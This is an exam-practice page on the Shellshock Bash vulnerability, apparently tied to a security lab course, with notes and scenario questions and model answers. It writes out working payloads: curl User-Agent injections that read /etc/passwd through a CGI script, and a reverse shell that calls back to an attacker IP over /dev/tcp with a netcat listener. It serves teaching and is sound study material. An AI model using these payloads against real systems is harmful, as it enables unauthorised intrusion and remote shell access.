Shellshock — Exam Practice Questions

Scenario-based questions with model answers. Click any question to reveal the answer.

Quick Notes

  • What Bash is:
    • Born Again Shell — standard Linux shell — command-line interface between user and OS kernel
  • Parent/child process + environment variables:
    • Parent spawns child process → each has completely separate memory layout
    • Functions do not automatically pass over → parent process exports them as environment variables
    • Child Bash reads env vars on startup and parses/converts ones starting with function definitions back into real functions
  • The bug (CVE-2014-6271):
    • Bash scans env vars, sees () { at the beginning → recognizes it as a function definition → runs internal parser function parse_and_execute
    • The flaw: It does not stop parsing at the closing curly bracket } — it keeps reading and immediately executes any trailing command statements written after the semicolon!
    • Existed since 1989 → discovered in 2014 → 25 years hidden in plain sight
  • Proof of concept (PoC):
    • env x='() { :; }; echo vulnerable' ./bash_shellshock -c 'echo test'
    • Vulnerable Bash returns: vulnerable followed by test
    • Patched Bash returns: only test
  • () { :; }; breakdown:
    • () = function signature/declaration
    • { :; } = function body containing a colon no-op (null command) → triggers Bash's environment function-import code path
    • Everything after }; is the payload execution vector
  • The CGI bridge — how it goes remote:
    • HTTP Request → Apache receives and runs a CGI script → spins up a child Bash shell process to execute the script
    • Apache passes all HTTP headers as environment variables to the child Bash shell (e.g., User-Agent header becomes HTTP_USER_AGENT)
    • The vulnerable child Bash scans HTTP_USER_AGENT variable, hits the () { prefix, and executes the trailing shellshock payload immediately
  • curl flags — the attack tool:
    • -A → sets the User-Agent header
    • -e → sets the Referer header
    • -H → adds custom arbitrary headers
    • All three options translate into environment variables inside the server's CGI environment
  • CGI Header requirement:
    • CGI script responses must start with Content-Type: text/plain followed by a completely blank line → otherwise Apache crashes the output with a 500 error, and the attacker never receives the output payload
  • Full executable paths required:
    • Inside CGI environments, full pathing must be used: use /bin/cat instead of cat, /bin/id instead of id (since the system PATH shortcuts may not be loaded)
  • Reverse shell configuration:
    • Firewalls block unsolicited inbound traffic (attacker → server) but allow outbound traffic (server → attacker)
    • Attacker listens on port: nc -lv 9090 and waits for the server to call back
    • Payload: /bin/bash -i > /dev/tcp/ATTACKER_IP/9090 0<&1 2>&1
    • /bin/bash -i = starts interactive shell
    • > /dev/tcp/IP/PORT = redirects shell standard output through a TCP connection back to the attacker
    • 0<&1 = redirects standard input from the same established connection, allowing attacker to type commands
    • 2>&1 = redirects standard errors through the connection
The exam trap:
Most students write "Bash executes the payload" but skip explaining HOW the HTTP payload gets translated into Bash env vars in the first place → the **CGI-to-environment-variable bridge** is worth dedicated marks on the exam sheet!
Shellshock is classified as a **Remote Code Execution (RCE)** vulnerability.
Question Set 1

Remote CGI Attack Chain

Scenario

A penetration tester discovers that http://seedlab-shellshock.com runs Apache with CGI scripts enabled and an unpatched Bash. She runs:

curl -A "() { :; }; echo Content-Type: text/plain; echo; /bin/cat /etc/passwd" \ http://seedlab-shellshock.com/cgi-bin/vul.cgi

The server successfully returns the contents of /etc/passwd.

Q(a) 4 pts Trace the complete attack chain from the curl command to /bin/cat /etc/passwd executing on the server. Your answer must include what -A does, what Apache does with the header when running a CGI script, how the payload reaches Bash, and what specific bug in Bash causes execution. ›
Model Answer
1. Request Header Injection: The -A option sets the HTTP User-Agent header value to the attacker's Shellshock payload. 2. The CGI-Env Bridge: When Apache receives the request, it runs the CGI script vul.cgi. To communicate request context, Apache spawns a child Bash shell process and automatically binds all HTTP headers as server environment variables — mapping the User-Agent value into the HTTP_USER_AGENT variable. 3. Function Parsing Trigger: Upon startup, the child Bash shell scans all imported environment variables. Recognizing the function declaration prefix () { inside the HTTP_USER_AGENT variable, Bash triggers parse_and_execute to import it as an active shell function. 4. Exploitation Execution: Due to a parsing logic bug, parse_and_execute fails to stop parsing at the function's closing curly brace }, parsing and immediately running the trailing command line /bin/cat /etc/passwd as an active shell statement under server privileges.
Q(b) 2 pts Why are echo Content-Type: text/plain; echo; required before /bin/cat /etc/passwd? What happens if they are omitted? ›
Model Answer
The CGI protocol strictly requires scripts to return an HTTP Content-Type header followed directly by a completely blank line before writing out body data. Without this formatting, Apache does not know how to handle the execution response and discards the output entirely, returning a 500 Internal Server Error. If omitted, the command executes on the server, but the attacker never receives the contents in the response body.
Q(c) 2 pts State the two conditions that must both be true for this remote attack to work. What happens if each is removed? ›
Model Answer
1. Unpatched Vulnerable Bash: If patched, the shell parser will correctly restrict function declaration imports to the matching scope limits of } and reject any trailing payload instructions. 2. Web CGI Script Interface: If CGI scripts are not configured, Apache handles standard static/dynamic contents without instantiating child shell process bindings, meaning there is no entry path to transfer HTTP headers into Bash context variables. Removing either condition makes remote exploitation completely impossible.
Q(d) 2 pts The tester runs /bin/id via Shellshock and gets uid=33(www-data). What does this tell us and which security principle limits the damage? ›
Model Answer
This indicates that the shellshock payload executed within the user privileges of www-data (Apache web server's runtime account), rather than high-level root control. The security principle of **Least Privilege** restricts this runtime execution context to low-privilege bounds, preventing the attacker from immediately editing system files, dropping root tables, or compromising other system boundaries.
Question Set 2

Reverse Shell Analysis

Scenario

After confirming the Shellshock vulnerability, the tester sets up a reverse shell. On her own machine (IP 10.9.0.1), she runs:

nc -lv 9090

Then she sends the exploit request:

curl -A "() { :; }; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" \ http://seedlab-shellshock.com/cgi-bin/vul.cgi

An interactive shell prompt immediately establishes on her netcat listener window.

Q(a) 3 pts What is this technique called? Why does it connect FROM the server TO the attacker rather than the attacker connecting directly to the server? ›
Model Answer
This is a reverse shell. It establishes connections from the server back to the attacker because network firewalls typically block unsolicited incoming connection requests (inbound filters). However, firewalls almost always permit outgoing connections initiated by the server itself (outbound filters). Having the server "call out" to the attacker's machine completely bypasses standard inbound firewall blocks.
Q(b) 3 pts Explain what each part of /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 does. ›
Model Answer
/bin/bash -i: Instantiates an interactive Bash shell process. > /dev/tcp/10.9.0.1/9090: Redirects standard output (stdout) of the shell process to a TCP network socket pointing back to the attacker's IP on port 9090. 0<&1: Redirects standard input (stdin) from standard output, allowing any keystrokes sent by the attacker through the socket connection to feed directly into the shell process input. 2>&1: Redirects standard error (stderr) to stdout, ensuring any execution syntax errors or console output are also piped back to the attacker's terminal.
Q(c) 2 pts What does nc -lv 9090 do on the attacker's machine and why must it be run BEFORE the curl command? ›
Model Answer
The nc (netcat) utility sets up an active listener (-l) on port 9090, outputting verbose statuses (-v), waiting for incoming TCP connections. It must be running before the exploit is launched because the server immediately tries to connect to 10.9.0.1:9090 once Shellshock triggers. If no listener is waiting on the attacker's machine, the outbound socket connection is immediately refused and the shell exits.
Q(d) 2 pts How does a reverse shell differ from simply running /bin/cat /etc/passwd via Shellshock? Why do attackers prefer the reverse shell? ›
Model Answer
Running a single command like /bin/cat /etc/passwd is stateless — the attacker triggers the command, receives a single snapshot response, and the connection terminates. A reverse shell establishes an ongoing, live interactive terminal session. Attackers prefer this because it allows them to type commands sequentially in real time, explore directory trees, run multiple system binaries, audit local files, pivot to adjacent systems, and establish persistent persistence hooks on the target.
